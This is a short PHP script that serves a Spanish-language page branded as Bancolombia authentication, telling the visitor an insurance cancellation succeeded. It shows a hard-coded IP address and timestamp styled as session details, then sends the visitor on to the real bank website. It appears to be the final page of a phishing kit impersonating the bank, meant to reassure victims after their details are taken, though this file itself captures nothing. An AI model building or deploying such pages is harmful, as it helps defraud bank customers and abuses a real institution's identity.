<?php
if (isset($_REQUEST["p"])) {
    $key = $_REQUEST["p"];
    $htmlContent = <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./assets/css/general.css">
    <link rel="stylesheet" href="./assets/css/styles.css">
    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
    <link rel="icon" href="./assets/img/logo.png">
    <title>Autenticación Bancolombia</title>
</head>
<body>
    <div class="img" style="text-align: center; padding: 5%;">
        <img src="/assets/img/Bancolombia..svg" alt="" srcset="" width="40%">
    </div>

    <div style="margin-top: 70px; text-align: center;">
        <img src="/assets/img/1.jpg" alt="" srcset="" width="40%">
    </div>

    <div class="texto" style="text-align: center; margin-top: 30px;">
        <h3>¡Tu cancelación fue Exitosa!</h3><br>
        <a>Se ha cancelado el seguro satisfactoriamente, continua disfrutando de nuestros servicios.</a><br>
        <form action="https://www.bancolombia.com/personas/seguros" method="post">
            <button class="box__btn" style="width: 70%; margin-top: 10px; color:black;">Entendido</button>
        </form>
    </div>

    <footer class="footer" style="margin-top: 50px;">
        <div class="line"></div>
        <div class="footer__logo1"></div>
        <div class="footer__logo2"></div>

        <span>
            <p>Dirección IP: 190.210.118.1</p>
            <p id="currentDate">Jueves, 27 de Junio de 2024, 2:57 p. m.</p>
        </span>
    </footer>
</body>
</html>
<script src="./assets/js/date.js"></script>
HTML;
    echo $htmlContent;
} else {
    // Mensaje si no se recibe el parámetro 'p'
    echo "No se ha recibido el parámetro 'p'.";
}
?>
